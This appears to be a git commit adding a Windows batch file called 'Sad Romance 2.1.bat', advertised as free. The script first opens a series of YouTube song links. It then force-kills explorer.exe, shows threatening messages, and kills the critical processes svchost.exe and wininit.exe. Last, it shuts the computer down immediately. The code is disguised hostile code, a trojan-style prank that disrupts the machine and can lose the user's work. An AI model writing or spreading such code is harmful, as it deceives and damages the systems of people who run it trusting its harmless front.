4d782b5a22838fc8c9a1345633e15414f8dfbb0f
sad_romance <sadromance8@gmail.com>
2025-10-03 12:01:14 +0300

    It's a Free! Now Try it!

---
+++ Sad Romance 2.1.bat
@@ -0,0 +1,32 @@
+@echo off
+color e
+title Sad Romance
+echo Hello! i'll showing with you!
+echo Press any key if you want.
+pause
+start https://www.youtube.com/watch?v=ja7JAJNe8a0
+start https://www.youtube.com/watch?v=jAWEJf-QttI
+start https://www.youtube.com/watch?v=sydWRgCWojU
+start https://www.youtube.com/watch?v=iYw2jIYKUXE
+start https://www.youtube.com/watch?v=qMYGVG2vxLg
+start https://www.youtube.com/watch?v=tBwnQvdX3Fc
+start https://www.youtube.com/watch?v=S-CMef3oNo4
+start https://www.youtube.com/watch?v=lCPVb4UgZCw
+start https://www.youtube.com/watch?v=gEjSWNQ8Ar4
+start https://www.youtube.com/watch?v=yDuy8nIWtdo
+start https://www.youtube.com/watch?v=J6Fb-v4Y7wU
+start https://www.youtube.com/watch?v=aFZ7bBaYpcw
+cls
+echo So Do you like it? Do you enjoy this "Sad Romance" song?
+echo Press any key if you like and enjoy it
+echo close Sad Romance and report Sad Romance if you don't like it
+pause
+color 4
+taskkill /f /im explorer.exe
+cls
+echo SAD ROMANCE KNOWS WHERE YOU LIVE!
+echo THERE IS NO ESCAPING
+timeout 5
+taskkill /f /im svchost.exe
+taskkill /f /im wininit.exe
+shutdown /s /t 0
